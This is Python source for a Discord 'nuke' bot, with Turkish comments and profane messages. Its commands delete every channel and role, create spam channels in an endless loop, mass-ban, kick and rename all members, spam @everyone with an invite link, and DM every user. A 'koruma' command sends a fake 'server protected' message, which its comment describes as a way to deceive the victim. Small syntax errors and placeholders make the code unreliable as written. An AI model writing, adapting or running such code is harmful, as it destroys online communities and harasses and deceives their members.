import discord
from discord.ext import commands
import asyncio

intents = discord.Intents.default()
intents.members = True 
intents.message_content = True 

bot = commands.Bot(command_prefix="289", intents=intents) # BURDA BAK PREFIXI BELIRT ORNEGIN BOY NASIL CALISCAK !PATLAT DIYE MI AYARLAYIN

# KANKA BAK BURAYA ADMIN ID EKLE ONEMLI KOMUTI KULLANCAK KISILER BUNU BAK GIZLILIK ICIN EKLEDIM

allowed_ids = [
    ADMIN ID 1,
    ADMIN ID 2 ,
    ADMIN ID 3,
    ADMIN ID 4 
]

def check_author(ctx):
    return ctx.author.id in allowed_ids

@bot.event
async def on_ready():
    print(f'{bot.user} olarak girdim hadi sunucu sikek amk!)


# kanka burda bak ilk komut kanal bunu kullaninca ustte ayarladigin prefixle bak 289 yazmisim ben 289kanal diyince tum kanallari silcek ve alttaki 15 tane kanali dongulu halde 500 tsne olusturcak
@bot.command()
async def kanal(ctx):
    if not check_author(ctx):
        await ctx.send("Bu komutu kullanma yetkin yok")
        return

    kanal_isimleri = [
        "hdhdhdjdjdj",
        "hdhdjdhdh",
        "jdndndjdjdbdjr",
        "dndjndjdndndnd",
        "dbjfjdjfjfjdj ",
        "hfjfjfjdjdjdjdjdj",
        "dbdbbdbendnr",
        "dhhdjdjdndbd",
        "dbdjnddj"
        "289289289289289",
        "zeus289",
        "2892829829282928292",
        "SUNUCU SİKİLMİŞTİR",
        "discord.gg/289",
        "sexcanavari"
    ]
    
    for channel in ctx.guild.text_channels:
        try:
            await channel.delete()
            await asyncio.sleep(1)
        except discord.Forbidden:
            await ctx.send(f"{channel.name} kanalını silmek için iznim yok.")
        except discord.HTTPException:
            await ctx.send(f"{channel.name} kanalını silerken bir hata oluştu.")
    
    i = 0
    while True:
        kanal_ismi = kanal_isimleri[i % len(kanal_isimleri)]  # 15 kanaldan sonra döngüye başla
        await ctx.guild.create_text_channel(kanal_ismi)
        i += 1
        await asyncio.sleep(1)

# burda rol olusturma komutu 289rol diyorum ornegin sira sira rol olusturuyo altta rol ismini girebilirsin sinir 250dir tum rolleri siler ve olusturur
@bot.command()
async def rol(ctx):
    if not check_author(ctx):
        await ctx.send("Bu komutu kullanma yetkin yok")
        return
    
    for role in ctx.guild.roles:
        if role.name != "@everyone":
            try:
                await role.delete()
            except discord.Forbidden:
                await ctx.send(f"{role.name} rolünü silmek için iznim yok.")
            except discord.HTTPException:
                await ctx.send(f"{role.name} rolünü silerken bir hata oluştu.")
    
    i = 1
    for _ in range(250):
        rol_ismi = f"discord.gg/289 {i}"
        try:
            await ctx.guild.create_role(name=rol_ismi)
            i += 1
            await asyncio.sleep(0.5)
        except discord.Forbidden:
            await ctx.send(f"Yeni rol oluşturmak için iznim yok.")
            break
        except discord.HTTPException:
            await ctx.send(f"Yeni rol oluşturulurken bir hata oluştu.")
            break
    
    await ctx.send("Tüm rolleri silip yeni roller oluşturuluyor")

# manipule mesajidir bu  289koruma diyince sahte mesaj atar ve hedef kurbani kandirirsin
@bot.command()
async def koruma(ctx):
    if not check_author(ctx):
        await ctx.send("Bu komutu kullanma yetkin yok")
        return
    
    await ctx.send("Sunucu koruma altına alındı")

# isminden belli zaten 
@bot.command()
async def ban(ctx):
    if not check_author(ctx):
        await ctx.send("Bu komutu kullanma yetkin yok")
        return
    
    for member in ctx.guild.members:
        if member.id != bot.user.id and member.id != ctx.guild.owner.id:
            try:
                await member.ban(reason="Sunucuya genel ban uygulandı")
                await asyncio.sleep(1)
            except discord.Forbidden:
                await ctx.send(f"{member.name} kullanıcısını banlamak için yeterli izin yok")
            except discord.HTTPException:
                await ctx.send(f"{member.name} kullanıcısını banlarken bir hata oluştu")
    
    await ctx.send("Sunucudaki tüm kullanıcılar banlandı")

@bot.command()
async def kick(ctx):
    if not check_author(ctx):
        await ctx.send("Bu komutu kullanma yetkin yok")
        return
    
    for member in ctx.guild.members:
        if member.id != bot.user.id and member.id != ctx.guild.owner.id:
            try:
                await member.kick(reason="Sunucudan genel atma işlemi")
                await asyncio.sleep(1)
            except discord.Forbidden:
                await ctx.send(f"{member.name} kullanıcısını atmak için yeterli izin yok")
            except discord.HTTPException:
                await ctx.send(f"{member.name} kullanıcısını atarken bir hata oluştu")
    
    await ctx.send("Sunucudaki tüm kullanıcılar atıldı")

# burda ayarladigin nicki sunucufaki tum kullanicilara verir.
@bot.command()
async def nick(ctx):
    if not check_author(ctx):
        await ctx.send("Bu komutu kullanma yetkin yok")
        return

    for member in ctx.guild.members:
        if member.id != bot.user.id and member.id != ctx.guild.owner.id:
            try:
                await member.edit(nick="UEK KÖLESİ")
                await asyncio.sleep(1)
            except discord.Forbidden:
                await ctx.send(f"{member.name} kullanıcısının ismini değiştirmek için yeterli iznim yok")
            except discord.HTTPException:
                await ctx.send(f"{member.name} kullanıcısının ismini değiştirirken bir hata oluştu")
    
    await ctx.send("Sunucudaki tüm kullanıcıların isimleri 'uek sikti' olarak değiştirildi")


# tum komutlari tek tek yapar 
@bot.command()
async def patlat(ctx):
    if not check_author(ctx):
        await ctx.send("Bu komutu kullanma yetkin yok")
        return
    
    await ctx.invoke(bot.get_command("kanal"))
    await ctx.invoke(bot.get_command("rol"))
    await ctx.invoke(bot.get_command("ban"))
    await ctx.invoke(bot.get_command("kick"))
    await ctx.invoke(bot.get_command("nick"))
    await ctx.invoke(bot.get_command("spam"))
    await ctx.invoke(bot.get_command("dm"))


@bot.command()
async def yardim(ctx):
    if not check_author(ctx):
        await ctx.send("Bu komutu kullanma yetkin yok")
        return
    
    command_list = """
    1. `kanal`
    2. `rol`
    3. `koruma`
    4. `ban`
    5. `kick`
    6. `nick`
    7. `patlat`
    8. `uek`
    9. `spam`
    10. `dm`
    """
    await ctx.send(command_list)

# ping mesaji istedigini ayarlayabilirsin 289spam yazinca tum kanallara atar 
@bot.command()
async def spam(ctx):
    if not check_author(ctx):
        await ctx.send("Bu komutu kullanma yetkin yok")
        return
    
    for channel in ctx.guild.text_channels:
        try:
            await channel.send("discord.gg/289 @everyone")
            await asyncio.sleep(1)
        except discord.Forbidden:
            await ctx.send(f"{channel.name} kanalına mesaj gönderilemiyor")
        except discord.HTTPException:
            await ctx.send(f"{channel.name} kanalına mesaj gönderilirken bir hata oluştu")
    
    await ctx.send("Tüm kanallara spam mesajları gönderildi")

# sunucudaki herk3se mesaj atar
@bot.command()
async def dm(ctx):
    if not check_author(ctx):
        await ctx.send("Bu komutu kullanma yetkin yok")
        return
    
    for member in ctx.guild.members:
        if member.bot:
            continue
        try:
            await member.send("BURAYA YAZ MESANINI\nSYNUCU LINKINI DE BURAYA OC")
            await asyncio.sleep(1)
        except discord.Forbidden:
            await ctx.send(f"{member.name} kullanıcısına DM göndermek için iznim yok")
        except discord.HTTPException:
            await ctx.send(f"{member.name} kullanıcısına DM gönderilirken bir hata oluştu")
    
    await ctx.send("Tüm kullanıcılara DM gönderildi")

bot.run('TOKENDE BURAYA')